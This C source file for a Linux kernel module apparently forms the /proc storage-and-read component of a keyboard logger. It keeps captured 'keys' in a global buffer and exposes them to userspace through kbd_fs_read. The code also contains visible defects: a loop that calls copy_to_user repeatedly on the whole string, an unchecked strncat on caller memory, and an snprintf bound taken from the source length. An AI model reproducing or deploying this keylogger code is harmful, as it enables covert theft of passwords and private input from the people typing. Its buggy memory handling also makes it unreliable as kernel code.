#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>

#include "fs.h"

char keys[MAX_PROC_SIZE];

const struct proc_ops proc_fops_keys = {
    .proc_flags      = PROC_ENTRY_PERMANENT,
    .proc_read       = kbd_fs_read,
};

/* Copies keys to userspace.
 * Returns the number of bytes written, else 0.
 * On error returns the corresponding error represented by negative number
*/
ssize_t
kbd_fs_read(struct file *file, char __user *buf, size_t len, loff_t *offset)
{
    unsigned int length = 0;
    char final_buf[MAX_PROC_SIZE];

    snprintf(final_buf, strlen(keys) + 1, "%s", keys);

    if (*offset == 0) 
    {
        while (final_buf[length] != 0) 
        {
            if (copy_to_user(buf, final_buf, strlen(final_buf) + 1))
                return -EFAULT;
            length++;
            (*offset)++;
        }
        return length;
    }
    return 0;
}

inline void append_to_keys(char *value)
{
	strncat(value, "\n", 2);
	if (strlen(keys) > MAX_PROC_SIZE - 10)
		memset(keys, 0, sizeof(keys));
	memcpy(&keys[strlen(keys)], value, strlen(value) + 1);
}